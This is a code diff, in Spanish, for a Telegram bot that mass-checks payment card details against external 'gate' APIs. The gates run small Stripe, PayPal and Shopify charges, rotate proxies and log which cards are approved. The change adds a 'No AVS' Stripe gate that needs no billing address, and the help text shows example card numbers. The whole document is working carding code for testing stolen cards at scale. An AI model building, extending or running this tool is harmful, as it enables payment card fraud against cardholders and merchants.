@@ -474,14 +474,15 @@ def consultar_bin(bin_number):
     except Exception as e:
         return {"error": str(e), "bin": bin_number}
 
-# ==================== FUNCIÓN DE VERIFICACIÓN STRIPE $1 ====================
+# ==================== NUEVA FUNCIÓN DE VERIFICACIÓN STRIPE $1 NO AVS (GATE 5) ====================
 
-def verificar_api_stripe(cc, proxy=None):
+def verificar_api_stripe_noavs(cc, proxy=None):
     """
-    Verifica usando Stripe (endpoint /api/check3) - $1.00
+    Verifica usando Stripe $1.00 No AVS (endpoint /api/check5) - Gate 5 de Samurai ApiHub
+    Zero billing address requirement, máximo efficiency
     """
     try:
-        api_url = f"https://samurai-api-hub.up.railway.app/api/check3?c={cc}"
+        api_url = f"https://samurai-api-hub.up.railway.app/api/check5?c={cc}"
         if proxy:
             api_url += f"&p={proxy}"
         
@@ -493,7 +494,7 @@ def verificar_api_stripe(cc, proxy=None):
             data = response.json()
             status = data.get('status', 'unknown')
             message = data.get('message', 'Sin mensaje')
-            gates = data.get('gates', 'stripe 1.00$ charged')
+            gates = data.get('gates', 'stripe 1.00$ charged (No AVS)')
             amount = data.get('amount', '1.00')
             
             return {
@@ -501,7 +502,7 @@ def verificar_api_stripe(cc, proxy=None):
                 'status': status,
                 'message': message,
                 'gates': gates,
-                'gate_name': 'Stripe $1.00',
+                'gate_name': 'Stripe $1 No AVS',
                 'amount': amount,
                 'proxy': proxy if proxy else 'gestionado',
                 'tiempo': elapsed
@@ -513,7 +514,7 @@ def verificar_api_stripe(cc, proxy=None):
                 'status': 'error',
                 'message': f'HTTP {response.status_code}',
                 'gates': 'stripe error',
-                'gate_name': 'Stripe $1.00',
+                'gate_name': 'Stripe $1 No AVS',
                 'amount': '1.00',
                 'proxy': proxy if proxy else 'gestionado',
                 'tiempo': elapsed
@@ -525,65 +526,8 @@ def verificar_api_stripe(cc, proxy=None):
             'status': 'error',
             'message': str(e),
             'gates': 'stripe error',
-            'gate_name': 'Stripe $1.00',
+            'gate_name': 'Stripe $1 No AVS',
             'amount': '1.00',
-            'proxy': proxy if proxy else 'gestionado',
-            'tiempo': 30
-        }
-
-# ==================== NUEVA FUNCIÓN DE VERIFICACIÓN STRIPE $1.34 ====================
-
-def verificar_api_stripe_134(cc, proxy=None):
-    """
-    Verifica usando Stripe $1.34 (endpoint /api/check2) - Gate 2 de Samurai ApiHub
-    """
-    try:
-        api_url = f"https://samurai-api-hub.up.railway.app/api/check2?c={cc}"
-        if proxy:
-            api_url += f"&p={proxy}"
-        
-        start_time = time.time()
-        response = requests.get(api_url, timeout=30)
-        elapsed = time.time() - start_time
-        
-        try:
-            data = response.json()
-            status = data.get('status', 'unknown')
-            message = data.get('message', 'Sin mensaje')
-            gates = data.get('gates', 'stripe 1.34$ charged')
-            amount = data.get('amount', '1.34')
-            
-            return {
-                'success': status == 'success',
-                'status': status,
-                'message': message,
-                'gates': gates,
-                'gate_name': 'Stripe $1.34',
-                'amount': amount,
-                'proxy': proxy if proxy else 'gestionado',
-                'tiempo': elapsed
-            }
-            
-        except json.JSONDecodeError:
-            return {
-                'success': False,
-                'status': 'error',
-                'message': f'HTTP {response.status_code}',
-                'gates': 'stripe error',
-                'gate_name': 'Stripe $1.34',
-                'amount': '1.34',
-                'proxy': proxy if proxy else 'gestionado',
-                'tiempo': elapsed
-            }
-            
-    except Exception as e:
-        return {
-            'success': False,
-            'status': 'error',
-            'message': str(e),
-            'gates': 'stripe error',
-            'gate_name': 'Stripe $1.34',
-            'amount': '1.34',
             'proxy': proxy if proxy else 'gestionado',
             'tiempo': 30
         }
@@ -956,13 +900,12 @@ def menu_principal():
     markup = types.InlineKeyboardMarkup(row_width=2)
     btn1 = types.InlineKeyboardButton("💳 Tarjetas", callback_data='menu_tarjetas')
     btn2 = types.InlineKeyboardButton("🌐 Proxies", callback_data='menu_proxies')
-    btn3 = types.InlineKeyboardButton("💵 Stripe $1", callback_data='menu_stripe')
-    btn4 = types.InlineKeyboardButton("💰 Stripe $1.34", callback_data='menu_stripe_134')
-    btn5 = types.InlineKeyboardButton("💰 PayPal", callback_data='menu_paypal')
-    btn6 = types.InlineKeyboardButton("🛍️ AutoShopify", callback_data='menu_shopify')
-    btn7 = types.InlineKeyboardButton("📊 Estadísticas", callback_data='menu_stats')
-    btn8 = types.InlineKeyboardButton("📁 Cargar archivo", callback_data='menu_cargar')
-    markup.add(btn1, btn2, btn3, btn4, btn5, btn6, btn7, btn8)
+    btn3 = types.InlineKeyboardButton("💵 Stripe $1 No AVS", callback_data='menu_stripe_noavs')
+    btn4 = types.InlineKeyboardButton("💰 PayPal", callback_data='menu_paypal')
+    btn5 = types.InlineKeyboardButton("🛍️ AutoShopify", callback_data='menu_shopify')
+    btn6 = types.InlineKeyboardButton("📊 Estadísticas", callback_data='menu_stats')
+    btn7 = types.InlineKeyboardButton("📁 Cargar archivo", callback_data='menu_cargar')
+    markup.add(btn1, btn2, btn3, btn4, btn5, btn6, btn7)
     return markup
 
 def menu_tarjetas():
@@ -1016,8 +959,7 @@ def cmd_menu(message):
         "║    🚀  AUTO SHOPIFY BOT    ║\n"
         "╠════════════════════════════╣\n"
         "║  Gates disponibles:         ║\n"
-        "║  • Stripe: $1.00            ║\n"
-        "║  • Stripe: $1.34 (NUEVO)    ║\n"
+        "║  • Stripe $1 No AVS (NUEVO) ║\n"
         "║  • PayPal: $10/$0.10/$1    ║\n"
         "║  • AutoShopify: variable   ║\n"
         "║                            ║\n"
@@ -1030,14 +972,12 @@ def cmd_menu(message):
         "║  • /sitios - Listar        ║\n"
         "║                            ║\n"
         "║  Comandos rápidos:          ║\n"
-        "║  /check CC - Stripe $1     ║\n"
-        "║  /check134 CC - Stripe $1.34║\n"
+        "║  /check5 CC - Stripe $1 No AVS║\n"
         "║  /pp CC - PayPal $10       ║\n"
         "║  /pp2 CC - PayPal $0.10    ║\n"
         "║  /pp3 CC - PayPal $1       ║\n"
         "║  /sh CC - AutoShopify      ║\n"
-        "║  /mass - Stripe $1 masivo  ║\n"
-        "║  /mass134 - Stripe $1.34 masivo║\n"
+        "║  /mass - Stripe $1 No AVS masivo║\n"
         "║  /mpp - PayPal masivo      ║\n"
         "║  /msh - Shopify masivo     ║\n"
         "╚════════════════════════════╝\n\n"
@@ -1055,16 +995,14 @@ def cmd_help(message):
         "║    navegar por el menú     ║\n"
         "║                            ║\n"
         "║  • Comandos individuales:  ║\n"
-        "║    /check CC - Stripe $1   ║\n"
-        "║    /check134 CC - Stripe $1.34║\n"
+        "║    /check5 CC - Stripe $1 No AVS║\n"
         "║    /pp CC - PayPal $10     ║\n"
         "║    /pp2 CC - PayPal $0.10  ║\n"
         "║    /pp3 CC - PayPal $1     ║\n"
         "║    /sh CC - AutoShopify    ║\n"
         "║                            ║\n"
         "║  • Comandos masivos:       ║\n"
-        "║    /mass - Stripe $1 masivo║\n"
-        "║    /mass134 - Stripe $1.34 masivo║\n"
+        "║    /mass - Stripe $1 No AVS masivo║\n"
         "║    /mpp - PayPal masivo    ║\n"
         "║    /msh - Shopify masivo   ║\n"
         "║                            ║\n"
@@ -1145,11 +1083,11 @@ def cmd_del_all_sitios(message):
         reply_markup=confirmacion
     )
 
-# ==================== COMANDOS DE VERIFICACIÓN STRIPE $1 ====================
+# ==================== NUEVO COMANDO PARA STRIPE $1 NO AVS (GATE 5) ====================
 
-@bot.message_handler(commands=['check'])
-def cmd_check(message):
-    """Verificar con Stripe $1.00"""
+@bot.message_handler(commands=['check5'])
+def cmd_check_5(message):
+    """Verificar con Stripe $1 No AVS (Gate 5)"""
     try:
         cc = message.text.split()[1]
         
@@ -1161,7 +1099,7 @@ def cmd_check(message):
         numero = partes[0]
         bin_num = numero[:6]
         
-        msg = bot.reply_to(message, "🔍 Verificando con Stripe $1.00...")
+        msg = bot.reply_to(message, "🔍 Verificando con Stripe $1 No AVS (Gate 5)...")
         
         bin_info = consultar_bin(bin_num)
         user_name = message.from_user.first_name if message.from_user else "User"
@@ -1171,71 +1109,24 @@ def cmd_check(message):
         
         if proxies:
             for proxy in proxies[:3]:
-                resultado = verificar_api_stripe(cc, proxy)
+                resultado = verificar_api_stripe_noavs(cc, proxy)
                 if not mejor_resultado or (resultado['status'] == 'success' and mejor_resultado['status'] != 'success'):
                     mejor_resultado = resultado
                 time.sleep(1)
         else:
-            mejor_resultado = verificar_api_stripe(cc)
+            mejor_resultado = verificar_api_stripe_noavs(cc)
         
         if mejor_resultado:
-            guardar_historial(cc, mejor_resultado['proxy'], 'Stripe', mejor_resultado['amount'], 
+            guardar_historial(cc, mejor_resultado['proxy'], 'Stripe $1 No AVS', mejor_resultado['amount'], 
                             mejor_resultado['status'], mejor_resultado['message'], mejor_resultado['gates'], bin_info)
             
-            texto_premium = formato_check_premium(cc, mejor_resultado, bin_info, mejor_resultado['tiempo'], user_name, "Stripe $1.00")
+            texto_premium = formato_check_premium(cc, mejor_resultado, bin_info, mejor_resultado['tiempo'], user_name, "Stripe $1 No AVS")
             bot.edit_message_text(texto_premium, message.chat.id, msg.message_id)
         else:
             bot.edit_message_text("❌ No se pudo verificar", message.chat.id, msg.message_id)
         
     except IndexError:
-        bot.reply_to(message, "❌ Uso: /check NUMERO|MES|AÑO|CVV")
-    except Exception as e:
-        bot.reply_to(message, f"❌ Error: {str(e)}")
-
-# ==================== NUEVO COMANDO PARA STRIPE $1.34 ====================
-
-@bot.message_handler(commands=['check134', 'ch134'])
-def cmd_check_134(message):
-    """Verificar con Stripe $1.34"""
-    try:
-        cc = message.text.split()[1]
-        
-        partes = cc.split('|')
-        if len(partes) != 4:
-            bot.reply_to(message, "❌ Formato incorrecto. Usa: NUMERO|MES|AÑO|CVV")
-            return
-        
-        numero = partes[0]
-        bin_num = numero[:6]
-        
-        msg = bot.reply_to(message, "🔍 Verificando con Stripe $1.34 (Gate 2)...")
-        
-        bin_info = consultar_bin(bin_num)
-        user_name = message.from_user.first_name if message.from_user else "User"
-        
-        proxies = obtener_proxies()
-        mejor_resultado = None
-        
-        if proxies:
-            for proxy in proxies[:3]:
-                resultado = verificar_api_stripe_134(cc, proxy)
-                if not mejor_resultado or (resultado['status'] == 'success' and mejor_resultado['status'] != 'success'):
-                    mejor_resultado = resultado
-                time.sleep(1)
-        else:
-            mejor_resultado = verificar_api_stripe_134(cc)
-        
-        if mejor_resultado:
-            guardar_historial(cc, mejor_resultado['proxy'], 'Stripe $1.34', mejor_resultado['amount'], 
-                            mejor_resultado['status'], mejor_resultado['message'], mejor_resultado['gates'], bin_info)
-            
-            texto_premium = formato_check_premium(cc, mejor_resultado, bin_info, mejor_resultado['tiempo'], user_name, "Stripe $1.34")
-            bot.edit_message_text(texto_premium, message.chat.id, msg.message_id)
-        else:
-            bot.edit_message_text("❌ No se pudo verificar", message.chat.id, msg.message_id)
-        
-    except IndexError:
-        bot.reply_to(message, "❌ Uso: /check134 NUMERO|MES|AÑO|CVV")
+        bot.reply_to(message, "❌ Uso: /check5 NUMERO|MES|AÑO|CVV")
     except Exception as e:
         bot.reply_to(message, f"❌ Error: {str(e)}")
 
@@ -1445,11 +1336,11 @@ def cmd_shopify(message):
     except Exception as e:
         bot.reply_to(message, f"❌ Error: {str(e)}")
 
-# ==================== VERIFICACIÓN MASIVA STRIPE $1 ====================
+# ==================== NUEVA VERIFICACIÓN MASIVA STRIPE $1 NO AVS ====================
 
 @bot.message_handler(commands=['mass'])
-def cmd_mass_stripe(message):
-    """Verificación masiva con Stripe $1.00"""
+def cmd_mass_stripe_noavs(message):
+    """Verificación masiva con Stripe $1 No AVS (Gate 5)"""
     
     tarjetas = obtener_todas_tarjetas()
     
@@ -1478,31 +1369,32 @@ def cmd_mass_stripe(message):
     if not proxies:
         bot.reply_to(message, "⚠️ Sin proxies - Usando modo gestionado")
     
-    task_id = f"mass_{datetime.now().strftime('%Y%m%d%H%M%S')}_{random.randint(1000,9999)}"
+    task_id = f"mass_noavs_{datetime.now().strftime('%Y%m%d%H%M%S')}_{random.randint(1000,9999)}"
     
     active_tasks[task_id] = {
         'chat_id': message.chat.id,
         'cancel': False
     }
     
-    config = f"""📋 VERIFICACIÓN MASIVA STRIPE $1
+    config = f"""📋 VERIFICACIÓN MASIVA STRIPE $1 NO AVS (GATE 5)
 ━━━━━━━━━━━━━━━━━━━━━━
 📌 Tarjetas: {len(tarjetas)}
 ⏱️ Delay: {delay}s
 🔔 Notificar: cada {notificar_cada}
 🆔 ID: {task_id}
+✨ Zero AVS requirement - Maximum efficiency
 
 /cancelar_{task_id} - Cancelar"""
     
     bot.reply_to(message, config)
     
-    thread = Thread(target=procesar_verificacion_masiva_stripe, 
+    thread = Thread(target=procesar_verificacion_masiva_stripe_noavs, 
                    args=(task_id, message.chat.id, delay, notificar_cada))
     thread.daemon = True
     thread.start()
 
-def procesar_verificacion_masiva_stripe(task_id, chat_id, delay, notificar_cada):
-    """Procesa verificación masiva con Stripe $1"""
+def procesar_verificacion_masiva_stripe_noavs(task_id, chat_id, delay, notificar_cada):
+    """Procesa verificación masiva con Stripe $1 No AVS"""
     
     cards = [c[0] for c in obtener_todas_tarjetas()]
     total = len(cards)
@@ -1511,7 +1403,7 @@ def procesar_verificacion_masiva_stripe(task_id, chat_id, delay, notificar_cada)
         bot.send_message(chat_id, "📭 No hay tarjetas guardadas")
         return
     
-    msg = bot.send_message(chat_id, "🔄 Iniciando verificación...")
+    msg = bot.send_message(chat_id, "🔄 Iniciando verificación Stripe $1 No AVS...")
     
     procesadas = 0
     resultados = {'success': 0, 'failed': 0, 'error': 0}
@@ -1529,15 +1421,15 @@ def procesar_verificacion_masiva_stripe(task_id, chat_id, delay, notificar_cada)
         mejor_resultado = None
         if proxies:
             for proxy in proxies[:2]:
-                resultado = verificar_api_stripe(card, proxy)
+                resultado = verificar_api_stripe_noavs(card, proxy)
                 if not mejor_resultado or resultado['status'] == 'success':
                     mejor_resultado = resultado
                 time.sleep(0.5)
         else:
-            mejor_resultado = verificar_api_stripe(card)
+            mejor_resultado = verificar_api_stripe_noavs(card)
         
         if mejor_resultado:
-            guardar_historial(card, mejor_resultado['proxy'], 'Stripe', mejor_resultado['amount'], 
+            guardar_historial(card, mejor_resultado['proxy'], 'Stripe $1 No AVS', mejor_resultado['amount'], 
                             mejor_resultado['status'], mejor_resultado['message'], mejor_resultado['gates'], bin_info)
             
             if mejor_resultado['status'] == 'success':
@@ -1582,9 +1474,9 @@ def procesar_verificacion_masiva_stripe(task_id, chat_id, delay, notificar_cada)
     minutos = int(tiempo_total // 60)
     segundos = int(tiempo_total % 60)
     
-    filename = f"resultados_stripe_{task_id}.txt"
+    filename = f"resultados_stripe_noavs_{task_id}.txt"
     with open(filename, 'w', encoding='utf-8') as f:
-        f.write(f"RESULTADOS VERIFICACIÓN STRIPE $1\n")
+        f.write(f"RESULTADOS VERIFICACIÓN STRIPE $1 NO AVS\n")
         f.write(f"━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n")
         f.write(f"Fecha: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n")
         f.write(f"Total tarjetas: {total}\n")
@@ -1598,13 +1490,14 @@ def procesar_verificacion_masiva_stripe(task_id, chat_id, delay, notificar_cada)
             f.write(f"{d}\n")
     
     # Mensaje final
-    texto_final = f"""✅ VERIFICACIÓN STRIPE $1 COMPLETADA
+    texto_final = f"""✅ VERIFICACIÓN STRIPE $1 NO AVS COMPLETADA
 ━━━━━━━━━━━━━━━━━━━━━━
 📊 RESULTADOS:
 ✅ Aprobadas: {resultados['success']}
 ❌ Declinadas: {resultados['failed']}
 ⚠️ Errores: {resultados['error']}
 ⏱️ Tiempo: {minutos}m {segundos}s
+✨ Zero AVS requirement - Maximum efficiency
 
 📁 Se generó archivo con detalles"""
     
@@ -1615,185 +1508,7 @@ def procesar_verificacion_masiva_stripe(task_id, chat_id, delay, notificar_cada)
     
     # Enviar archivo
     with open(filename, 'rb') as f:
-        bot.send_document(chat_id, f, caption=f"📊 Resultados Stripe $1 - {total} tarjetas")
-    
-    os.remove(filename)
-    
-    time.sleep(300)
-    if task_id in active_tasks:
-        del active_tasks[task_id]
-
-# ==================== NUEVA VERIFICACIÓN MASIVA STRIPE $1.34 ====================
-
-@bot.message_handler(commands=['mass134'])
-def cmd_mass_stripe_134(message):
-    """Verificación masiva con Stripe $1.34"""
-    
-    tarjetas = obtener_todas_tarjetas()
-    
-    if not tarjetas:
-        bot.reply_to(message, "📭 No hay tarjetas guardadas")
-        return
-    
-    # Procesar opciones
-    texto = message.text.split()
-    delay = 2
-    notificar_cada = 10
-    
-    for i, arg in enumerate(texto):
-        if arg == '--delay' and i+1 < len(texto):
-            try:
-                delay = int(texto[i+1])
-            except:
-                pass
-        elif arg == '--notificar' and i+1 < len(texto):
-            try:
-                notificar_cada = int(texto[i+1])
-            except:
-                pass
-    
-    proxies = obtener_proxies()
-    if not proxies:
-        bot.reply_to(message, "⚠️ Sin proxies - Usando modo gestionado")
-    
-    task_id = f"mass134_{datetime.now().strftime('%Y%m%d%H%M%S')}_{random.randint(1000,9999)}"
-    
-    active_tasks[task_id] = {
-        'chat_id': message.chat.id,
-        'cancel': False
-    }
-    
-    config = f"""📋 VERIFICACIÓN MASIVA STRIPE $1.34 (GATE 2)
-━━━━━━━━━━━━━━━━━━━━━━
-📌 Tarjetas: {len(tarjetas)}
-⏱️ Delay: {delay}s
-🔔 Notificar: cada {notificar_cada}
-🆔 ID: {task_id}
-
-/cancelar_{task_id} - Cancelar"""
-    
-    bot.reply_to(message, config)
-    
-    thread = Thread(target=procesar_verificacion_masiva_stripe_134, 
-                   args=(task_id, message.chat.id, delay, notificar_cada))
-    thread.daemon = True
-    thread.start()
-
-def procesar_verificacion_masiva_stripe_134(task_id, chat_id, delay, notificar_cada):
-    """Procesa verificación masiva con Stripe $1.34"""
-    
-    cards = [c[0] for c in obtener_todas_tarjetas()]
-    total = len(cards)
-    
-    if total == 0:
-        bot.send_message(chat_id, "📭 No hay tarjetas guardadas")
-        return
-    
-    msg = bot.send_message(chat_id, "🔄 Iniciando verificación Stripe $1.34...")
-    
-    procesadas = 0
-    resultados = {'success': 0, 'failed': 0, 'error': 0}
-    detalles = []
-    start_time = time.time()
-    
-    for i, card in enumerate(cards, 1):
-        if task_id in active_tasks and active_tasks[task_id].get('cancel'):
-            bot.edit_message_text("🛑 Cancelado", chat_id, msg.message_id)
-            break
-        
-        bin_info = consultar_bin(card[:6])
-        proxies = obtener_proxies()
-        
-        mejor_resultado = None
-        if proxies:
-            for proxy in proxies[:2]:
-                resultado = verificar_api_stripe_134(card, proxy)
-                if not mejor_resultado or resultado['status'] == 'success':
-                    mejor_resultado = resultado
-                time.sleep(0.5)
-        else:
-            mejor_resultado = verificar_api_stripe_134(card)
-        
-        if mejor_resultado:
-            guardar_historial(card, mejor_resultado['proxy'], 'Stripe $1.34', mejor_resultado['amount'], 
-                            mejor_resultado['status'], mejor_resultado['message'], mejor_resultado['gates'], bin_info)
-            
-            if mejor_resultado['status'] == 'success':
-                resultados['success'] += 1
-                estado_emoji = "✅"
-            elif mejor_resultado['status'] == 'failed':
-                resultados['failed'] += 1
-                estado_emoji = "❌"
-            else:
-                resultados['error'] += 1
-                estado_emoji = "⚠️"
-            
-            # Guardar detalle
-            detalles.append(f"{estado_emoji} {card} | {mejor_resultado['status']} | {mejor_resultado['message'][:50]} | {mejor_resultado['proxy']}")
-        else:
-            detalles.append(f"❌ {card} | ERROR")
-        
-        procesadas = i
-        
-        # Actualizar cada N tarjetas
-        if i % notificar_cada == 0 or i == total:
-            porcentaje = (i / total) * 100
-            barra = "█" * int(porcentaje/10) + "░" * (10 - int(porcentaje/10))
-            
-            texto = f"""📊 PROGRESO: {i}/{total}
-{barra} {porcentaje:.0f}%
-
-✅ Aprobadas: {resultados['success']}
-❌ Declinadas: {resultados['failed']}
-⚠️ Errores: {resultados['error']}"""
-            
-            try:
-                bot.edit_message_text(texto, chat_id, msg.message_id)
-            except:
-                pass
-        
-        if delay > 0 and i < total:
-            time.sleep(delay)
-    
-    # Generar archivo de resultados
-    tiempo_total = time.time() - start_time
-    minutos = int(tiempo_total // 60)
-    segundos = int(tiempo_total % 60)
-    
-    filename = f"resultados_stripe134_{task_id}.txt"
-    with open(filename, 'w', encoding='utf-8') as f:
-        f.write(f"RESULTADOS VERIFICACIÓN STRIPE $1.34\n")
-        f.write(f"━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n")
-        f.write(f"Fecha: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n")
-        f.write(f"Total tarjetas: {total}\n")
-        f.write(f"Tiempo: {minutos}m {segundos}s\n")
-        f.write(f"━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n")
-        f.write(f"✅ Aprobadas: {resultados['success']}\n")
-        f.write(f"❌ Declinadas: {resultados['failed']}\n")
-        f.write(f"⚠️ Errores: {resultados['error']}\n\n")
-        f.write(f"━━━━ DETALLES ━━━━━━━━━━━━━━\n\n")
-        for d in detalles:
-            f.write(f"{d}\n")
-    
-    # Mensaje final
-    texto_final = f"""✅ VERIFICACIÓN STRIPE $1.34 COMPLETADA
-━━━━━━━━━━━━━━━━━━━━━━
-📊 RESULTADOS:
-✅ Aprobadas: {resultados['success']}
-❌ Declinadas: {resultados['failed']}
-⚠️ Errores: {resultados['error']}
-⏱️ Tiempo: {minutos}m {segundos}s
-
-📁 Se generó archivo con detalles"""
-    
-    try:
-        bot.edit_message_text(texto_final, chat_id, msg.message_id)
-    except:
-        bot.send_message(chat_id, texto_final)
-    
-    # Enviar archivo
-    with open(filename, 'rb') as f:
-        bot.send_document(chat_id, f, caption=f"📊 Resultados Stripe $1.34 - {total} tarjetas")
+        bot.send_document(chat_id, f, caption=f"📊 Resultados Stripe $1 No AVS - {total} tarjetas")
     
     os.remove(filename)
     
@@ -2249,17 +1964,15 @@ def callback_handler(call):
             reply_markup=menu_paypal()
         )
     
-    elif call.data == 'menu_stripe':
+    elif call.data == 'menu_stripe_noavs':
         bot.send_message(
             call.message.chat.id,
-            "💳 *STRIPE $1.00*\n\nUsa: `/check NUMERO|MES|AÑO|CVV`\n\nEjemplo: `/check 4169161481963022|09|2029|859`",
-            parse_mode='Markdown'
-        )
-    
-    elif call.data == 'menu_stripe_134':
-        bot.send_message(
-            call.message.chat.id,
-            "💳 *STRIPE $1.34 (GATE 2)*\n\nUsa: `/check134 NUMERO|MES|AÑO|CVV`\n\nEjemplo: `/check134 4169161481963022|09|2029|859`\n\nMasivo: `/mass134`",
+            "💳 *STRIPE $1 NO AVS (GATE 5)*\n\n"
+            "✨ **Zero AVS Requirement**\n"
+            "Máxima eficiencia sin necesidad de dirección\n\n"
+            "Usa: `/check5 NUMERO|MES|AÑO|CVV`\n\n"
+            "Ejemplo: `/check5 5282274314918862|10|2029|335`\n\n"
+            "Masivo: `/mass`",
             parse_mode='Markdown'
         )
     
@@ -2693,21 +2406,19 @@ def default(message):
 
 if __name__ == "__main__":
     print("="*80)
-    print("🤖 AUTO SHOPIFY BOT - VERSIÓN COMPLETA CON 4 GATES")
+    print("🤖 AUTO SHOPIFY BOT - VERSIÓN CON GATE 5 (STRIPE $1 NO AVS)")
     print("="*80)
     print("✅ Gates disponibles:")
-    print("   • Stripe: $1.00       → /check")
-    print("   • Stripe: $1.34       → /check134 (NUEVO)")
-    print("   • PayPal: $10         → /pp")
-    print("   • PayPal: $0.10       → /pp2")
-    print("   • PayPal: $1          → /pp3")
-    print("   • AutoShopify: variable → /sh")
+    print("   • Stripe $1 No AVS  → /check5 (NUEVO - Zero AVS)")
+    print("   • PayPal: $10       → /pp")
+    print("   • PayPal: $0.10     → /pp2")
+    print("   • PayPal: $1        → /pp3")
+    print("   • AutoShopify       → /sh")
     print("="*80)
     print("✅ Comandos masivos:")
-    print("   • Stripe $1 masivo   → /mass")
-    print("   • Stripe $1.34 masivo → /mass134")
-    print("   • PayPal masivo      → /mpp")
-    print("   • Shopify masivo     → /msh")
+    print("   • Stripe $1 No AVS masivo → /mass")
+    print("   • PayPal masivo           → /mpp")
+    print("   • Shopify masivo          → /msh")
     print("="*80)
     print("✅ Proxies y Sitios:")
     print("   • /addproxy, /proxies, /px, /delallproxy")
